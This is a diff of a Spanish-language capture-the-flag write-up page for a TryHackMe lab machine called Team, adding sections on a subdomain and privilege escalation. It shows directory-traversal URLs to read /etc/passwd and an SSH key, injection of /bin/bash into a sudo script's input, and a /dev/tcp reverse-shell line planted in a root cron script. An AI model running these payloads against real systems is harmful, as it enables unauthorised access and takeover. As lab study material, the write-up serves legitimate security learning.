@@ -106,10 +106,10 @@ $ ping -c 1 10."/>
     
     "dateModified": "2023-02-09T00:00:00\u002b00:00",
     
-    "keywords": ["CTF","Fácil","Linux","Fuzzing","Directory Traversal"],
+    "keywords": ["CTF","Fácil","Linux","Fuzzing","Directory Traversal","cronjob"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "707"
+    "wordCount": "1128"
   }]
   </script>
 
@@ -700,7 +700,7 @@ if (!doNotTrack) {
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-02-09 00:00:00 &#43;0000 UTC">09/02/2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+  <time datetime="2023-02-09 00:00:00 &#43;0000 UTC">09/02/2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
   
 
   
@@ -806,6 +806,17 @@ if (!doNotTrack) {
 
   </span>
   
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/cronjob/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    cronjob
+  </span>
+</span>
+
+  </span>
+  
   
   
   
@@ -834,13 +845,19 @@ if (!doNotTrack) {
         <li><a href="#whatweb">Whatweb</a></li>
       </ul>
     </li>
-    <li><a href="#web">Web</a>
+    <li><a href="#web-teamthm">Web team.thm</a>
       <ul>
         <li><a href="#reconocimiento-1">Reconocimiento</a></li>
       </ul>
     </li>
     <li><a href="#ftp">Ftp</a></li>
-    <li><a href="#dev">dev</a></li>
+    <li><a href="#subdominio-devteamthm">Subdominio dev.team.thm</a></li>
+    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>
+      <ul>
+        <li><a href="#gyles">Gyles</a></li>
+        <li><a href="#root">Root</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -860,13 +877,19 @@ if (!doNotTrack) {
         <li><a href="#whatweb">Whatweb</a></li>
       </ul>
     </li>
-    <li><a href="#web">Web</a>
+    <li><a href="#web-teamthm">Web team.thm</a>
       <ul>
         <li><a href="#reconocimiento-1">Reconocimiento</a></li>
       </ul>
     </li>
     <li><a href="#ftp">Ftp</a></li>
-    <li><a href="#dev">dev</a></li>
+    <li><a href="#subdominio-devteamthm">Subdominio dev.team.thm</a></li>
+    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>
+      <ul>
+        <li><a href="#gyles">Gyles</a></li>
+        <li><a href="#root">Root</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -983,16 +1006,16 @@ if (!doNotTrack) {
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
             style="text-decoration-line: none !important;" href="#whatweb" aria-label="Anchor">#</a></span>        
     
-</h3><p>Ejecutamos un whatweb para ver mas información sobre la web</p>
+</h3><p>Ejecutamos un whatweb para ver más información sobre la web</p>
 <pre tabindex="0"><code>$ whatweb 10.10.67.245
 http://10.10.67.245 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.67.245], Title[Apache2 Ubuntu Default Page: It works! If you see this add &#39;team.thm&#39; to your hosts!]
-</code></pre><p>En el ittulo pone que hay que añadir team.thm en el /etc/hosts</p>
-<div id="web" class="anchor">Web></div>
-<h2 class="relative group">Web 
+</code></pre><p>En el titulo pone que hay que añadir team.thm en el /etc/hosts</p>
+<div id="web-teamthm" class="anchor">Web team.thm></div>
+<h2 class="relative group">Web team.thm 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#web" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#web-teamthm" aria-label="Anchor">#</a></span>        
     
 </h2><div id="reconocimiento-1" class="anchor">Reconocimiento></div>
 <h3 class="relative group">Reconocimiento 
@@ -1007,38 +1030,38 @@ http://10.10.67.245 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[U
 000000274:   301        9 L      28 W       306 Ch      &#34;scripts&#34;                       
 000000016:   301        9 L      28 W       305 Ch      &#34;images&#34; 
 </code></pre><p>Volvemos a hacer el escaneo sobre el directorio scripts con el diccionario <code>SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt</code></p>
-<pre tabindex="0"><code>$ wfuzz -c -t 200 --hc=404,403 -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt &#34;http://team.thm/scripts/FUZZ.txt&#34;
-
-000000297:   200        21 L     71 W       597 Ch      &#34;script&#34; 
-</code></pre><p>Contenido del script.txt</p>
-<pre tabindex="0"><code>#!/bin/bash
-read -p &#34;Enter Username: &#34; REDACTED
-read -sp &#34;Enter Username Password: &#34; REDACTED
-echo
-ftp_server=&#34;localhost&#34;
-ftp_username=&#34;$Username&#34;
-ftp_password=&#34;$Password&#34;
-mkdir /home/username/linux/source_folder
-source_folder=&#34;/home/username/source_folder/&#34;
-cp -avr config* $source_folder
-dest_folder=&#34;/home/username/linux/dest_folder/&#34;
-ftp -in $ftp_server &lt;&lt;END_SCRIPT
-quote USER $ftp_username
-quote PASS $decrypt
-cd $source_folder
-!cd $dest_folder
-mget -R *
-quit
-
-# Updated version of the script
-# Note to self had to change the extension of the old &#34;script&#34; in this folder, as it has creds in
-</code></pre><p>Al final vemos que hay una nota que dice que tuvieron que cambiar la extension del script antiguo porque tenia <strong>CREDENCIALES</strong></p>
-<p>Vamos a hacer fuzzing con wfuzz usando un dicionario de extensiones.</p>
-<pre tabindex="0"><code>$ wfuzz -c -t 200 --hc=404,403 -w /opt/SecLists/Fuzzing/extensions-skipfish.fuzz.txt &#34;http://team.thm/scripts/script.FUZZ&#34;
-
-000000086:   200        21 L     71 W       597 Ch      &#34;txt&#34;                           
-000000053:   200        18 L     44 W       466 Ch      &#34;old&#34;
-</code></pre><p>Ya tenemos la extensión del antiguo script. Si lo abrimos vemos las credenciales del usuario ftpuser</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span>404,403 -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt <span class="s2">&#34;http://team.thm/scripts/FUZZ.txt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000297:   <span class="m">200</span>        <span class="m">21</span> L     <span class="m">71</span> W       <span class="m">597</span> Ch      <span class="s2">&#34;script&#34;</span> 
+</span></span></code></pre></div><p>Contenido del script.txt</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">read</span> -p <span class="s2">&#34;Enter Username: &#34;</span> REDACTED
+</span></span><span class="line"><span class="cl"><span class="nb">read</span> -sp <span class="s2">&#34;Enter Username Password: &#34;</span> REDACTED
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ftp_server</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ftp_username</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$Username</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ftp_password</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$Password</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">mkdir /home/username/linux/source_folder
+</span></span><span class="line"><span class="cl"><span class="nv">source_folder</span><span class="o">=</span><span class="s2">&#34;/home/username/source_folder/&#34;</span>
+</span></span><span class="line"><span class="cl">cp -avr config* <span class="nv">$source_folder</span>
+</span></span><span class="line"><span class="cl"><span class="nv">dest_folder</span><span class="o">=</span><span class="s2">&#34;/home/username/linux/dest_folder/&#34;</span>
+</span></span><span class="line"><span class="cl">ftp -in <span class="nv">$ftp_server</span> <span class="s">&lt;&lt;END_SCRIPT
+</span></span></span><span class="line"><span class="cl"><span class="s">quote USE</span>R <span class="nv">$ftp_username</span>
+</span></span><span class="line"><span class="cl">quote PASS <span class="nv">$decrypt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> <span class="nv">$source_folder</span>
+</span></span><span class="line"><span class="cl">!cd <span class="nv">$dest_folder</span>
+</span></span><span class="line"><span class="cl">mget -R *
+</span></span><span class="line"><span class="cl">quit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Updated version of the script</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Note to self had to change the extension of the old &#34;script&#34; in this folder, as it has creds in</span>
+</span></span></code></pre></div><p>Al final vemos que hay una nota que dice que tuvieron que cambiar la extensión del script antiguo porque tenía <strong>CREDENCIALES</strong></p>
+<p>Vamos a hacer fuzzing con wfuzz usando un diccionario de extensiones.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span>404,403 -w /opt/SecLists/Fuzzing/extensions-skipfish.fuzz.txt <span class="s2">&#34;http://team.thm/scripts/script.FUZZ&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000086:   <span class="m">200</span>        <span class="m">21</span> L     <span class="m">71</span> W       <span class="m">597</span> Ch      <span class="s2">&#34;txt&#34;</span>                           
+</span></span><span class="line"><span class="cl">000000053:   <span class="m">200</span>        <span class="m">18</span> L     <span class="m">44</span> W       <span class="m">466</span> Ch      <span class="s2">&#34;old&#34;</span>
+</span></span></code></pre></div><p>Ya tenemos la extensión del antiguo script. Si lo abrimos vemos las credenciales del usuario ftpuser</p>
 <div id="ftp" class="anchor">Ftp></div>
 <h2 class="relative group">Ftp 
     <span
@@ -1047,15 +1070,181 @@ quit
             style="text-decoration-line: none !important;" href="#ftp" aria-label="Anchor">#</a></span>        
     
 </h2><p>Nos conectamos por ftp como ftpuser. Dentro vemos que hay un archivo que se llama <code>New_site.txt</code> que nos lo podemos bajar a nuestra máquina con un get <code>get New_site.txt</code> para ver su contenido</p>
-<p>El contenido del archivo es un mensaje dirijido de <strong>gyles</strong> a <strong>dale</strong> en el cual se dice que estan empezando a programar una nueva web en un subdomino llamado <strong>dev</strong> y tambien dice que hay una copia del <strong>id_rsa</strong> en el archivo de configuración del ssh</p>
-<div id="dev" class="anchor">dev></div>
-<h2 class="relative group">dev 
+<p>El contenido del archivo es un mensaje dirijido de <strong>gyles</strong> a <strong>dale</strong> en el cual se dice que están empezando a programar una nueva web en un subdominio llamado <strong>dev</strong> y también dice que hay una copia del <strong>id_rsa</strong> en el archivo de configuración del ssh</p>
+<p>Esto lo podríamos haber encontrado antes con gobuster:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u team.thm -t <span class="m">50</span> --append-domain
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Found: dev.team.thm Status: <span class="m">200</span> <span class="o">[</span>Size: 187<span class="o">]</span>
+</span></span></code></pre></div><div id="subdominio-devteamthm" class="anchor">Subdominio dev.team.thm></div>
+<h2 class="relative group">Subdominio dev.team.thm 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#dev" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#subdominio-devteamthm" aria-label="Anchor">#</a></span>        
     
 </h2><p>Antes que nada es importante añadir el subdominio dev al <code>/etc/hosts</code></p>
+<p>Al entrar a <a href="http://dev.team.thm/"   target="_blank">
+    http://dev.team.thm/</a> vemos que hay un link a <a href="http://dev.team.thm/script.php?page=teamshare.php"   target="_blank">
+    http://dev.team.thm/script.php?page=teamshare.php</a> viendo la url podemos ver que a lo mejor podemos hacer <strong>Directory Traversal</strong> Que consiste en salir del directorio y poder ver archivos del servidor</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /thm/team/images/directory-traversal_hub4c74dbe64809dfe6206bde50d86f7be_106786_330x0_resize_box_3.png 330w,
+        /thm/team/images/directory-traversal_hub4c74dbe64809dfe6206bde50d86f7be_106786_660x0_resize_box_3.png 660w,
+        /thm/team/images/directory-traversal_hub4c74dbe64809dfe6206bde50d86f7be_106786_1024x0_resize_box_3.png 1024w,
+        /thm/team/images/directory-traversal_hub4c74dbe64809dfe6206bde50d86f7be_106786_1320x0_resize_box_3.png 2x"
+        src="/thm/team/images/directory-traversal_hub4c74dbe64809dfe6206bde50d86f7be_106786_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>Al probar de ir a <a href="http://dev.team.thm/script.php?page=../../../../etc/passwd"   target="_blank">
+    http://dev.team.thm/script.php?page=../../../../etc/passwd</a> Vemos que nos muestra el <code>/etc/passwd</code></p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /thm/team/images/passwd_huf31e7b45b530b0bab37800b42ce54b60_146473_330x0_resize_box_3.png 330w,
+        /thm/team/images/passwd_huf31e7b45b530b0bab37800b42ce54b60_146473_660x0_resize_box_3.png 660w,
+        /thm/team/images/passwd_huf31e7b45b530b0bab37800b42ce54b60_146473_1024x0_resize_box_3.png 1024w,
+        /thm/team/images/passwd_huf31e7b45b530b0bab37800b42ce54b60_146473_1320x0_resize_box_3.png 2x"
+        src="/thm/team/images/passwd_huf31e7b45b530b0bab37800b42ce54b60_146473_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>Si recordamos lo que ponía en la nota de ftp, había una parte que decía que habían puesto el id_rsa de dale en el archivo de configuración del ssh así que podemos probar de ver el archivo /etc/ssh/sshd_config</p>
+<p>
+
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      
+      <img
+        class="my-0 rounded-md"
+        srcset="
+        /thm/team/images/id_rsa_hubaa838d841d70cc238cee86810686a6a_312346_330x0_resize_box_3.png 330w,
+        /thm/team/images/id_rsa_hubaa838d841d70cc238cee86810686a6a_312346_660x0_resize_box_3.png 660w,
+        /thm/team/images/id_rsa_hubaa838d841d70cc238cee86810686a6a_312346_1024x0_resize_box_3.png 1024w,
+        /thm/team/images/id_rsa_hubaa838d841d70cc238cee86810686a6a_312346_1320x0_resize_box_3.png 2x"
+        src="/thm/team/images/id_rsa_hubaa838d841d70cc238cee86810686a6a_312346_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+      
+    </figure>
+  
+
+</p>
+<p>Nos lo guardamos en un archivo llamado id_rsa le damos permisos con chmod <code>chmod 600 id_rsa</code>, por último nos conectamos por ssh <code>ssh -i id_rsa dale@10.10.67.245</code></p>
+<div id="escalada-de-privilegios" class="anchor">Escalada de privilegios></div>
+<h2 class="relative group">Escalada de privilegios 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#escalada-de-privilegios" aria-label="Anchor">#</a></span>        
+    
+</h2><div id="gyles" class="anchor">Gyles></div>
+<h3 class="relative group">Gyles 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#gyles" aria-label="Anchor">#</a></span>        
+    
+</h3><p>Con sudo -l vemos que podemos ejecutar un archivo como gyles sin proporcionar contraseña</p>
+<pre tabindex="0"><code>dale@TEAM:~$ sudo -l
+
+User dale may run the following commands on TEAM:
+    (gyles) NOPASSWD: /home/gyles/admin_checks
+</code></pre><p>Si le hacemos un cat podemos ver que hay una parte en la cual se guarda un input nuestro ($error) y lo ejecuta</p>
+<pre tabindex="0"><code>#!/bin/bash
+
+printf &#34;Reading stats.\n&#34;
+sleep 1
+printf &#34;Reading stats..\n&#34;
+sleep 1
+read -p &#34;Enter name of person backing up the data: &#34; name
+echo $name  &gt;&gt; /var/stats/stats.txt
+read -p &#34;Enter &#39;date&#39; to timestamp the file: &#34; error
+printf &#34;The Date is &#34;
+$error 2&gt;/dev/null
+
+date_save=$(date &#34;+%F-%H-%M&#34;)
+cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
+
+printf &#34;Stats have been backed up\n&#34;
+</code></pre><pre tabindex="0"><code>dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: test
+Enter &#39;date&#39; to timestamp the file: /bin/bash
+The Date is 
+whoami
+gyles
+</code></pre><p>Ya somos gyles</p>
+<p>(Para que salga el prompt podemos poner <code>script /dev/null -c bash</code>)</p>
+<div id="root" class="anchor">Root></div>
+<h3 class="relative group">Root 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#root" aria-label="Anchor">#</a></span>        
+    
+</h3><p>En el directorio <code>/opt/admin_stuff</code> hay un script de root</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-rwxr--r-- <span class="m">1</span> root root <span class="m">200</span> Jan <span class="m">17</span>  <span class="m">2021</span> script.sh
+</span></span></code></pre></div><p>con lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">#I have set a cronjob to run this script every minute</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">dev_site</span><span class="o">=</span><span class="s2">&#34;/usr/local/sbin/dev_backup.sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">main_site</span><span class="o">=</span><span class="s2">&#34;/usr/local/bin/main_backup.sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#Back ups the sites locally</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$main_site</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dev_site</span>
+</span></span></code></pre></div><p>Podemos ver que ejecuta dos scripts y dice que este archivo se ejecuta cada minuto automáticamente como root</p>
+<p>Este archivo no lo podemos modificar pero el <code>main_backup.sh</code> sí.</p>
+<p>Lo que vamos a hacer es dentro del <code>main_backup.sh</code> poner lo siguiente para mandarnos una reverse shell por el puerto 443</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></div><p>Nos ponemos en escucha por el puerto 443 con nc y a esperar</p>
+<p>Recibimos la reverse shell como root!</p>
 
         </br></br>
         
